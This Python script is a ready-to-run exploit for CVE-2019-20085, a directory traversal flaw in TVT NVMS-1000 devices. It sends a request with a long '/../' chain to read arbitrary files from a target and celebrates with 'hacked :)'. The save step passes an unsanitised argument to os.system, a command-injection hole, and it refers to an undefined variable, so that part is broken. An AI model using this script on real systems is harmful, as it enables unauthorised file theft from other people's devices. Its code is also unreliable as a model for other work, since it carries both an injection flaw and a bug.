import argparse
import requests
import sys
import os
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2019-20085
# TVT NVMS-1000 devices allow GET /.. Directory Traversal
class CVE2019_20085:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}

    def __init__(self, url, filename, savefile):
        print (LogColors.BLUE + "victim url: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.filename, self.savefile = filename, savefile
        self.session = requests.Session()

    # run exploit, directory traversal
    def run(self):
        print (LogColors.BLUE + "try to read: " + self.filename + "..." + LogColors.ENDC)
        url = self.url.strip("/") + "/../../../../../../../../../../../../../" + self.filename
        print (LogColors.YELLOW + "request: " + url + "..." + LogColors.ENDC)

        r = self.session.get(url, headers = self.headers, verify = False)
        if r.ok:
            print (LogColors.YELLOW + "file content:" + LogColors.ENDC)
            print (LogColors.YELLOW + r.text + LogColors.ENDC)
            print (LogColors.GREEN + "successful read. hacked :)" + LogColors.ENDC)
            print (LogColors.BLUE + "save to file: " + self.savefile + LogColors.ENDC)
            os.system("touch " + self.savefile)
            with open(savefile, "r+") as sf:
                sf.write(r.text)
        else:
            print (LogColors.RED + "host: " + self.url + " not vulnerable" + LogColors.ENDC)
            print (LogColors.RED + "failed directory traversal :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-f','--file', required = True, help = "file for read")
    parser.add_argument('-s','--save', required = True, help = "destination file name")
    args = vars(parser.parse_args())
    url = args['url']
    f, s = args['file'], args['save']
    cve = CVE2019_20085(url, f, s)
    cve.run()

